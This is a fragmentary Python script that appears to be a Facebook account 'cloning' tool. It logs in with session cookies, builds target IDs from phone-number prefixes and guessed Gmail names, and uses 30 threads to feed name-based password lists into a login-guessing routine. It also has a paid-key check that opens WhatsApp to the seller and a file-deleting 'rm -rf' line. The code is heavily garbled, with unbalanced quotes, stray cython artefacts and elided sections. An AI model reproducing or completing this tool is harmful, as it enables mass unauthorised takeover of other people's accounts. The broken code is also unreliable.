...
def login():
        ...
        try:
                data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilya/5.0 (Linux; Android 6.7.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookies})
                ...
                print('\033[1;31m Cookies has been expired...')
                os.system('rm -rf .t ok.txt');time.sleep(1);login()
                login()
def public():
        usrr=[]
        clear()
        try:
                ...
                print(Your cookies han expired...');time.sleep(1)
                login()
        except IOError:
                print(Your cookies han expired...');time.sleep(1)
                login()
...
print( Welcome '+name)
                ...
                print( cookies han expired...');time.sleep(1)
                login()
        try:
                jum=int(input(How many ids you went to clone ?\033[1;37m '))
        except ValueError:
...
def menu():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        print( Your Not Premium User...!\033[1;37m");time.sleep(1)
                        clear()
                        ...
                        linex()
                        print(Your Key Not Registered\033[1;37m')
                        print(fYour Key : {fkeyx}")
                        ...
                        linex()
                        tks = ("Hi nouman Sir, I Need To Buy Your Paid shar PRO Tools Version 1.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python shar.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def pak():
                user=[]
                clear()
                print(Code example: 0306,0315,0335,0345')
                code = input( put code: ')
                try:
                ...
                with tred(max_workers=30) as Aking:     
                        ...
                        print(f \x1b[38;5;208mUse flight mode for speed up\033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
...
def bd():
                ...
                with tred(max_workers=30) as Aking:     
                        ...
                        tl = str(len(user))
                        print(' Total account : \033[1;32m'+tl)
                        print(f Choice code ..:\033[1;32m '+code)
                        print(f \x1b[38;5;208mUse flight mode for speed up\033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
...
def gmail():
                ...
                clear()
                print( example: muhammad, ali, sajjad, faizan\')
                linex()
                first = input(' Put first name: ')
                linex()
                print('\033[1;37m example: khan, ahmad, ali \')
                linex()
...
def api1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [shar] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
